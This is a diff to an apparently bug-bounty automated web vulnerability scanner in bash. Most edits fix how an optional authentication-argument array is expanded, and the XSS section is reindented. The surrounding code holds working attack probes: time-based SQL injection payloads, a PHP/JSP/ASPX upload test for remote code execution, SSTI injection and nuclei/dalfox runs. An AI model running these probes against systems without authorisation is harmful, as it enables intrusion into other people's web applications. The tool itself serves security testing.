@@ -149,17 +149,17 @@ verify_sqli_poc() {
     log_step "  [VERIFY] Linear scaling check on param #$p_idx ($dialect)..."
     
     # 1. Baseline (0s)
-    T0_START=$(date +%s%N); curl -sk -o /dev/null --max-time 20 "${BB_AUTH_ARGS[@]}" "$url"; T0=$(( ($(date +%s%N) - T0_START) / 1000000 ))
+    T0_START=$(date +%s%N); curl -sk -o /dev/null --max-time 20 ${BB_AUTH_ARGS[@]+"${BB_AUTH_ARGS[@]}"} "$url"; T0=$(( ($(date +%s%N) - T0_START) / 1000000 ))
 
     # 2. 1s Sleep
     local pl1="'%20AND%20SLEEP(1)--%20"; [ "$dialect" = "postgres" ] && pl1="'||pg_sleep(1)--%20"
     U1=$(echo "$url" | sed "s/=\([^&]*\)/=$pl1/$p_idx")
-    T1_START=$(date +%s%N); curl -sk -o /dev/null --max-time 25 "${BB_AUTH_ARGS[@]}" "$U1"; T1=$(( ($(date +%s%N) - T1_START) / 1000000 ))
+    T1_START=$(date +%s%N); curl -sk -o /dev/null --max-time 25 ${BB_AUTH_ARGS[@]+"${BB_AUTH_ARGS[@]}"} "$U1"; T1=$(( ($(date +%s%N) - T1_START) / 1000000 ))
 
     # 3. 2s Sleep
     local pl2="'%20AND%20SLEEP(2)--%20"; [ "$dialect" = "postgres" ] && pl2="'||pg_sleep(2)--%20"
     U2=$(echo "$url" | sed "s/=\([^&]*\)/=$pl2/$p_idx")
-    T2_START=$(date +%s%N); curl -sk -o /dev/null --max-time 30 "${BB_AUTH_ARGS[@]}" "$U2"; T2=$(( ($(date +%s%N) - T2_START) / 1000000 ))
+    T2_START=$(date +%s%N); curl -sk -o /dev/null --max-time 30 ${BB_AUTH_ARGS[@]+"${BB_AUTH_ARGS[@]}"} "$U2"; T2=$(( ($(date +%s%N) - T2_START) / 1000000 ))
     
     D1=$(( T1 - T0 )); D2=$(( T2 - T1 ))
     # Allow 200ms jitter
@@ -175,7 +175,7 @@ verify_upload_poc() {
     
     # Tech Detection
     local ext="php"; local payload='<?php echo "RCE-VAL-".(7*7); ?>'
-    local headers=$(curl -sk -I --max-time 5 "${BB_AUTH_ARGS[@]}" "$upload_url" || true)
+    local headers=$(curl -sk -I --max-time 5 ${BB_AUTH_ARGS[@]+"${BB_AUTH_ARGS[@]}"} "$upload_url" || true)
     if echo "$headers" | grep -qi "jsp\|java\|tomcat"; then ext="jsp"; payload='<% out.print("RCE-VAL-" + (7*7)); %>'; fi
     if echo "$headers" | grep -qi "asp\|aspx\|\.net"; then ext="aspx"; payload='<% Response.Write("RCE-VAL-" + (7*7)) %>'; fi
     
@@ -185,12 +185,12 @@ verify_upload_poc() {
     
     for param in "file" "upload" "FileData" "userfile" "image"; do
         # Try upload
-        curl -sk -F "${param}=@/tmp/${canary}" --max-time 10 "${BB_AUTH_ARGS[@]}" "$upload_url" > /dev/null || true
+        curl -sk -F "${param}=@/tmp/${canary}" --max-time 10 ${BB_AUTH_ARGS[@]+"${BB_AUTH_ARGS[@]}"} "$upload_url" > /dev/null || true
 
         # Check common upload dirs
         for dir in "/" "/uploads/" "/files/" "/media/" "/temp/" "/images/" "/wp-content/uploads/"; do
             local probe_url="${base_url}${dir}${canary}"
-            local resp=$(curl -sk -f --max-time 5 "${BB_AUTH_ARGS[@]}" "$probe_url" || true)
+            local resp=$(curl -sk -f --max-time 5 ${BB_AUTH_ARGS[@]+"${BB_AUTH_ARGS[@]}"} "$probe_url" || true)
             if echo "$resp" | grep -q "RCE-VAL-49"; then
                 log_crit "  [POC-RCE-CONFIRMED] Code Execution Verified: $probe_url"
                 echo "[RCE-POC] $probe_url" >> "$FINDINGS_DIR/upload/verified_rce_pocs.txt"
@@ -247,7 +247,7 @@ if ! skip_has sqli; then
     # 2a. Nuclei
     if tool_ok nuclei; then
         log_step "nuclei SQLi templates..."
-        nuclei -l "$ORDERED_SCAN" -tags sqli -severity medium,high,critical -silent "${BB_AUTH_ARGS[@]}" -o "$FINDINGS_DIR/sqli/nuclei_sqli.txt" || true
+        nuclei -l "$ORDERED_SCAN" -tags sqli -severity medium,high,critical -silent ${BB_AUTH_ARGS[@]+"${BB_AUTH_ARGS[@]}"} -o "$FINDINGS_DIR/sqli/nuclei_sqli.txt" || true
     fi
     # 2b. Manual Linear-Scaling Probes
     PARAMS_FILE="$RECON_DIR/urls/with_params.txt"
@@ -255,7 +255,7 @@ if ! skip_has sqli; then
         log_step "Advanced SQLi verification on top 10 parameterised URLs..."
         head -10 "$PARAMS_FILE" | while read -r url; do
             [ -z "$url" ] && continue
-            T_START=$(date +%s%N); curl -sk -o /dev/null --max-time 10 "${BB_AUTH_ARGS[@]}" "$url"; BASE_MS=$(( ($(date +%s%N) - T_START) / 1000000 ))
+            T_START=$(date +%s%N); curl -sk -o /dev/null --max-time 10 ${BB_AUTH_ARGS[@]+"${BB_AUTH_ARGS[@]}"} "$url"; BASE_MS=$(( ($(date +%s%N) - T_START) / 1000000 ))
             P_COUNT=$(echo "$url" | grep -o "=" | wc -l | tr -d ' ')
             [ "$P_COUNT" -eq 0 ] && continue
             for i in $(seq 1 "$P_COUNT"); do
@@ -263,7 +263,7 @@ if ! skip_has sqli; then
                     p="'%20AND%20SLEEP(2)--%20"; [ "$dialect" = "postgres" ] && p="'||pg_sleep(2)--%20"
                     # Fixed sed: use alternate delimiter and correct numeric occurrence
                     SU=$(echo "$url" | sed "s/=\([^&]*\)/=$p/$i")
-                    TS=$(date +%s%N); curl -sk -o /dev/null --max-time 20 "${BB_AUTH_ARGS[@]}" "$SU" >/dev/null 2>&1; RC=$?; TE=$(( ($(date +%s%N) - TS) / 1000000 ))
+                    TS=$(date +%s%N); curl -sk -o /dev/null --max-time 20 ${BB_AUTH_ARGS[@]+"${BB_AUTH_ARGS[@]}"} "$SU" >/dev/null 2>&1; RC=$?; TE=$(( ($(date +%s%N) - TS) / 1000000 ))
                     if [ "$RC" -eq 0 ] && [ "$((TE - BASE_MS))" -gt 1800 ]; then
                         if verify_sqli_poc "$url" "$i" "$dialect"; then
                             log_crit "EMPIRICAL SQLI POC: $url"
@@ -286,14 +286,14 @@ fi
 # ── Check 3: XSS ────────────────────────────────────────────────────────
 if ! skip_has xss; then
     log_info "Check 3: XSS (dalfox + URL dedup + global timeout)"
-    PARAM_URLS="$RECON_DIR/urls/with_params.txt"
-    if command -v dalfox &>/dev/null && [ -s "$PARAM_URLS" ]; then
-    DAL_LIMIT=$([ "$QUICK_MODE" = "--quick" ] && echo 30 || echo 100)
-    DAL_MAX_TIME=$([ "$QUICK_MODE" = "--quick" ] && echo 300 || echo 900)
-    # Deduplicate by base-URL + sorted param keys to avoid scanning the same
-    # endpoint N times with different random values (e.g. ?rand=1.234 variants)
-    DAL_DEDUP_FILE=$(mktemp /tmp/dalfox_dedup_XXXXXX.txt)
-    python3 - "$PARAM_URLS" "$DAL_DEDUP_FILE" <<'PYEOF' 2>/dev/null || cp "$PARAM_URLS" "$DAL_DEDUP_FILE"
+    PARAMS_FILE="$RECON_DIR/urls/with_params.txt"
+    if tool_ok dalfox && [ -s "$PARAMS_FILE" ]; then
+        DAL_LIMIT=$([ "$QUICK_MODE" = "--quick" ] && echo 30 || echo 100)
+        DAL_MAX_TIME=$([ "$QUICK_MODE" = "--quick" ] && echo 300 || echo 900)
+        # Deduplicate by base-URL + sorted param keys to avoid scanning the same
+        # endpoint N times with different random values (e.g. ?rand=1.234 variants)
+        DAL_DEDUP_FILE=$(mktemp /tmp/dalfox_dedup_XXXXXX.txt)
+        python3 - "$PARAMS_FILE" "$DAL_DEDUP_FILE" <<'PYEOF' 2>/dev/null || cp "$PARAMS_FILE" "$DAL_DEDUP_FILE"
 import sys
 from urllib.parse import urlparse, parse_qs
 seen = set()
@@ -311,22 +311,25 @@ with open(sys.argv[1]) as fin, open(sys.argv[2], 'w') as fout:
             seen.add(key)
             fout.write(url + '\n')
 PYEOF
-    ORIG_COUNT=$(wc -l < "$PARAM_URLS" 2>/dev/null || echo 0)
-    DEDUP_COUNT=$(wc -l < "$DAL_DEDUP_FILE" 2>/dev/null || echo 0)
-    log_step "Running dalfox on $DAL_LIMIT URLs (deduped $ORIG_COUNT → $DEDUP_COUNT, timeout: ${DAL_MAX_TIME}s)..."
-    head -"$DAL_LIMIT" "$DAL_DEDUP_FILE" | \
-        timeout "$DAL_MAX_TIME" dalfox pipe \
-        --silence \
-        --no-color \
-        --worker 5 \
-        --delay 100 \
-        --timeout 10 \
-        "${BB_AUTH_ARGS[@]}" \
-        --output "$FINDINGS_DIR/xss/dalfox_results.txt" 2>/dev/null || true
-    rm -f "$DAL_DEDUP_FILE"
+        ORIG_COUNT=$(wc -l < "$PARAMS_FILE" 2>/dev/null || echo 0)
+        DEDUP_COUNT=$(wc -l < "$DAL_DEDUP_FILE" 2>/dev/null || echo 0)
+        log_step "Running dalfox on $DAL_LIMIT URLs (deduped $ORIG_COUNT -> $DEDUP_COUNT, timeout: ${DAL_MAX_TIME}s)..."
+        head -"$DAL_LIMIT" "$DAL_DEDUP_FILE" | \
+            timeout "$DAL_MAX_TIME" dalfox pipe \
+            --silence \
+            --no-color \
+            --worker 5 \
+            --delay 100 \
+            --timeout 10 \
+            ${BB_AUTH_ARGS[@]+"${BB_AUTH_ARGS[@]}"} \
+            --output "$FINDINGS_DIR/xss/dalfox_results.txt" 2>/dev/null || true
+        rm -f "$DAL_DEDUP_FILE"
 
-    DALFOX_COUNT=$(count_findings "$FINDINGS_DIR/xss/dalfox_results.txt")
-    [ "$DALFOX_COUNT" -gt 0 ] && log_vuln "Dalfox found $DALFOX_COUNT potential XSS" || log_done "Dalfox: no XSS found"
+        DALFOX_COUNT=$(count_vuln "$FINDINGS_DIR/xss/dalfox_results.txt")
+        [ "$DALFOX_COUNT" -gt 0 ] && log_vuln "Dalfox found $DALFOX_COUNT potential XSS" || log_done "Dalfox: no XSS found"
+    else
+        [ -s "$PARAMS_FILE" ] || log_warn "No parameterized URLs found for XSS scan"
+        tool_ok dalfox || log_warn "dalfox not installed — skipping XSS scan"
     fi
 fi
 
@@ -351,7 +354,7 @@ if ! skip_has ssti; then
                 payload="${SSTI_PAYLOADS[$idx]}"
                 enc_payload=$(python3 -c "import urllib.parse; print(urllib.parse.quote('''$payload'''))" 2>/dev/null || echo "$payload")
                 injected=$(echo "$url" | sed "s/=\([^&]*\)/=${enc_payload}/g")
-                body=$(curl -sk --max-time 10 "${BB_AUTH_ARGS[@]}" "$injected" 2>/dev/null || true)
+                body=$(curl -sk --max-time 10 ${BB_AUTH_ARGS[@]+"${BB_AUTH_ARGS[@]}"} "$injected" 2>/dev/null || true)
                 if echo "$body" | grep -qE '(\b49\b|7777777)'; then
                     log_crit "SSTI confirmed [$engine]: $injected"
                     echo "[SSTI-CONFIRMED] engine=$engine url=$injected" >> "$SSTI_OUT"
@@ -369,7 +372,7 @@ if ! skip_has cms; then
     log_info "Check 7: CMS Detection & MSF Generation"
     head -50 "$ORDERED_SCAN" | while read -r url; do
         [ -z "$url" ] && continue
-        RES=$(curl -sk --max-time 10 "${BB_AUTH_ARGS[@]}" "$url" 2>/dev/null || true)
+        RES=$(curl -sk --max-time 10 ${BB_AUTH_ARGS[@]+"${BB_AUTH_ARGS[@]}"} "$url" 2>/dev/null || true)
         CMS=""; if echo "$RES" | grep -qi "wp-content\|wordpress"; then CMS="wordpress"; elif echo "$RES" | grep -qi "drupal"; then CMS="drupal"; fi
         if [ -n "$CMS" ]; then
             log_vuln "$CMS detected: $url"
